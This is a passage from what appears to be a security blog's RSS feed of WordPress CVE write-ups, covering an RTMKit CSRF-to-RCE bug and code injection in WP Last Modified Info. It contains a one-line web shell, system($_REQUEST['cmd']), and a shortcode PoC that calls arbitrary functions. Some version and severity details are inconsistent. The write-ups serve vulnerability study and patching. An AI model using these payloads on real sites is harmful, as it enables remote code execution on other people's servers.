system($_REQUEST[&amp;#39;cmd&amp;#39;]);&#xA;    }&#xA;});&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Trigger RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-03-cve-2025-30911/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#39; alt=&#34;Result&#34; height=&#34;813&#34; width=&#34;1249&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;RTMKit &amp;lt;= 1.5.4&lt;/strong&gt; lies in the &lt;code&gt;install_requirements()&lt;/code&gt; function, where the value of &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt; is processed directly to install and activate a plugin without sufficient validation. Version &lt;strong&gt;1.5.4&lt;/strong&gt; introduced a permission check using &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;, but still lacked &lt;strong&gt;CSRF&lt;/strong&gt; protection, allowing an attacker to abuse a logged-in &lt;strong&gt;Administrator&lt;/strong&gt; to send a hidden request and install a malicious plugin. It was only in &lt;strong&gt;v1.5.5&lt;/strong&gt; that the addition of &lt;code&gt;wp_verify_nonce()&lt;/code&gt; fully addressed the issue and prevented the risk of &lt;strong&gt;RCE&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always validate both permissions and &lt;strong&gt;nonces&lt;/strong&gt; for every AJAX endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Never process direct user input for sensitive operations such as installing/activating plugins.&lt;/li&gt;&#xA;&lt;li&gt;Permission checks alone are not enough; &lt;strong&gt;CSRF&lt;/strong&gt; protection is also required.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-romethemekit-for-elementor-plugin-1-5-4-arbitrary-plugin-installation-activation-to-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin &amp;lt;= 1.5.4 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52756 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-02-cve-2025-52756/</link>
      <pubDate>Tue, 02 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-02-cve-2025-52756/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; vulnerability in Sayan Datta’s &lt;strong&gt;WP Last Modified Info (wp-last-modified-info)&lt;/strong&gt; plugin allows &lt;strong&gt;Remote Code Inclusion&lt;/strong&gt;. This issue affects &lt;strong&gt;WP Last Modified Info&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; through &lt;strong&gt;&amp;lt;= 1.9.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52756&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52756&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.9.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.9.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-last-modified-info/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Last Modified Info Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – WP Last Modified Info&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.9.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt; → &lt;strong&gt;Meld&lt;/strong&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.9.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function render( $atts ) {&#xA;    $post = get_post();&#xA;    if ( ! $post instanceof \WP_Post ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if ( ! $this-&amp;gt;is_enabled( &amp;#39;enable_last_modified_cb&amp;#39; ) ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $author_id = $this-&amp;gt;get_meta( $post-&amp;gt;ID, &amp;#39;_edit_last&amp;#39; );&#xA;    if ( $this-&amp;gt;is_equal( &amp;#39;show_author_cb&amp;#39;, &amp;#39;custom&amp;#39;, &amp;#39;default&amp;#39; ) ) {&#xA;        $author_id = $this-&amp;gt;get_data( &amp;#39;lmt_show_author_list&amp;#39; );&#xA;    }&#xA;    &#xA;    $default_format = get_option( &amp;#39;date_format&amp;#39; );&#xA;    $atts = shortcode_atts( [&#xA;        &amp;#39;id&amp;#39;           =&amp;gt; $post-&amp;gt;ID,&#xA;        &amp;#39;template&amp;#39;     =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_last_modified_info_template&amp;#39; ),&#xA;        &amp;#39;date_format&amp;#39;  =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_date_time_format&amp;#39;, $default_format ),&#xA;        &amp;#39;date_type&amp;#39;    =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_last_modified_format_post&amp;#39;, &amp;#39;default&amp;#39; ),&#xA;        &amp;#39;schema&amp;#39;       =&amp;gt; $this-&amp;gt;get_data( &amp;#39;lmt_enable_jsonld_markup_cb&amp;#39;, &amp;#39;disable&amp;#39; ),&#xA;        &amp;#39;author_id&amp;#39;    =&amp;gt; (int) $author_id,&#xA;        &amp;#39;hide_archive&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;filter_ids&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;gap&amp;#39;          =&amp;gt; (int) $this-&amp;gt;get_data( &amp;#39;lmt_gap_on_post&amp;#39;, 0 ),&#xA;    ], $atts, &amp;#39;lmt-post-modified-info&amp;#39; );&#xA;&#xA;    $_post = get_post( absint( $atts[&amp;#39;id&amp;#39;] ) );&#xA;    if ( ! $_post ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    if ( $atts[&amp;#39;hide_archive&amp;#39;] !== &amp;#39;&amp;#39; ) {&#xA;        foreach ( array_map( &amp;#39;trim&amp;#39;, explode( &amp;#39;,&amp;#39;, $atts[&amp;#39;hide_archive&amp;#39;] ) ) as $callback ) {&#xA;            if ( is_callable( $callback ) &amp;amp;&amp;amp; $callback() ) {&#xA;                return &amp;#39;&amp;#39;;&#xA;            }&#xA;        }&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;render()&lt;/code&gt; function of the shortcode accepts the &lt;code&gt;$atts[&#39;hide_archive&#39;]&lt;/code&gt; attribute from the user. This value is a string containing a &lt;strong&gt;list of function names&lt;/strong&gt;, separated by commas (&lt;code&gt;,&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$atts[&amp;#39;hide_archive&amp;#39;] = &amp;#34;a,b,c&amp;#34;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;explode(&amp;#39;,&amp;#39;, $atts[&amp;#39;hide_archive&amp;#39;]) &#xA;→ [&amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;, &amp;#39;c&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After splitting the string using &lt;code&gt;explode()&lt;/code&gt;, the code uses:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array_map(&amp;#39;trim&amp;#39;, ...)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;to &lt;strong&gt;remove extra whitespace&lt;/strong&gt; at the beginning and end of each element, ensuring the function names are “clean” before processing. The result is still an array of strings, but normalized:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[&amp;#34; a &amp;#34;, &amp;#34; b &amp;#34;, &amp;#34; c &amp;#34;] → [&amp;#34;a&amp;#34;, &amp;#34;b&amp;#34;, &amp;#34;c&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Next, the &lt;code&gt;foreach&lt;/code&gt; loop iterates over each item and assigns it to the &lt;code&gt;$callback&lt;/code&gt; variable. Here, &lt;code&gt;$callback&lt;/code&gt; is a &lt;strong&gt;function name in string form&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( ... as $callback ) &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For each &lt;code&gt;$callback&lt;/code&gt;, the code checks:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;is_callable( $callback )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means:&#xA;👉 Whether the function name &lt;strong&gt;exists and can be called&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;If it is callable, the code then directly invokes the function:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;No parameters are passed. If the called function returns &lt;code&gt;true&lt;/code&gt;, the plugin will:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and &lt;strong&gt;display nothing for the shortcode&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v1.9.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch introduces a whitelist of allowed functions to prevent arbitrary function execution.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Shortcode extends PostView {&#xA;    ...&#xA;    if ( in_array( $archive, $this-&amp;gt;functions, true ) &amp;amp;&amp;amp; is_callable( $archive ) &amp;amp;&amp;amp; $archive() ) {&#xA;        return $content;&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;class PostView {&#xA;    protected $functions = [&#xA;        &amp;#39;is_archive&amp;#39;,&#xA;        &amp;#39;is_tax&amp;#39;,&#xA;        &amp;#39;is_home&amp;#39;,&#xA;        &amp;#39;is_front_page&amp;#39;,&#xA;        &amp;#39;is_search&amp;#39;,&#xA;        &amp;#39;is_404&amp;#39;,&#xA;        &amp;#39;is_author&amp;#39;,&#xA;        &amp;#39;is_category&amp;#39;,&#xA;        &amp;#39;is_tag&amp;#39;,&#xA;    ];&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since the &lt;code&gt;Shortcode&lt;/code&gt; class extends &lt;code&gt;PostView&lt;/code&gt;, it can use the &lt;code&gt;$functions&lt;/code&gt; property from the parent class.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a shortcode with the following line:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_shortcode( &amp;#39;lmt-post-modified-info&amp;#39;, [ $this, &amp;#39;render&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that when WordPress encounters the &lt;strong&gt;&lt;code&gt;lmt-post-modified-info&lt;/code&gt;&lt;/strong&gt; shortcode in a post’s content (or when the post is rendered containing this shortcode), WordPress will &lt;strong&gt;call the &lt;code&gt;render()&lt;/code&gt; method of the current class&lt;/strong&gt; to generate the output.&lt;/p&gt;&#xA;&lt;p&gt;To have the &lt;code&gt;render()&lt;/code&gt; logic executed, the following condition must be satisfied:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $this-&amp;gt;is_enabled( &amp;#39;enable_last_modified_cb&amp;#39; ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means the option must be enabled:&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Show Info on Frontend&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Contributor adds shortcode [lmt-post-modified-info hide_archive=&amp;#39;...&amp;#39;] in post&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;WordPress loads the post content&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Shortcode::render($atts) is executed&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$atts[&amp;#39;hide_archive&amp;#39;] is parsed and trimmed into list of callbacks&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;For each $callback in list&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;is_callable($callback)?&amp;#34;}&#xA;F --&amp;gt;|Yes| G[&amp;#34;Invoke $callback()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Use an &lt;strong&gt;Administrator&lt;/strong&gt; account to enable the &lt;code&gt;Show Info on Frontend&lt;/code&gt; option&lt;/li&gt;&#xA;&lt;li&gt;Log in as a &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Create a post containing the shortcode:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[lmt-post-modified-info hide_archive=phpinfo]&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Submit and preview the post.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-02-cve-2025-52756/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-02-cve-2025-52756/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; 